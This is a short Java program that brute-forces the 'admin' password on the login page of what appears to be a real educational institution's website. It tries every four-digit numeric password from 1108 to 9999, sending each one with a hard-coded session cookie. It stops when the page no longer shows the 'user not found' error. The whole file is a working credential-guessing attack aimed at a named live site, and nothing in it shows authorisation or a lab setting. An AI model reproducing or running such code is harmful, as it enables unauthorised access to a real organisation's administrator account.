package org.example.Algorithms;

import okhttp3.*;

import java.io.IOException;

public class Test {
    public static void main(String[] args) {
        for (int i = 1108; i < 10000; i++) {
            if (test(String.valueOf(i))) {
                break;
            }
        }
    }

    public static boolean test(String pass) {
        OkHttpClient client = new OkHttpClient().newBuilder()
                .build();
        MediaType mediaType = MediaType.parse("text/plain");
        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("username", "admin")
                .addFormDataPart("password", pass)
                .addFormDataPart("login", "Iniciar+Sesión")
                .build();
        Request request = new Request.Builder()
                .url("https://www.itstena.edu.ec/directorio/")
                .method("POST", body)
                .addHeader("Cookie", "PHPSESSID=d51603701f7baa61f2cc9f8fd18aef7b")
                .build();
        try {


            Response response = client.newCall(request).execute();

            if (response.body().string().contains("<div class=\"error\">Usuario no encontrado.</div>")) {
                System.out.println("Usuario no encontrado: " + pass);
                return false;
            } else {
                System.out.println("Password encontrado: " + pass);
                return true;
            }


        } catch (IOException e) {
            e.printStackTrace();
        }

        return false;
    }
}
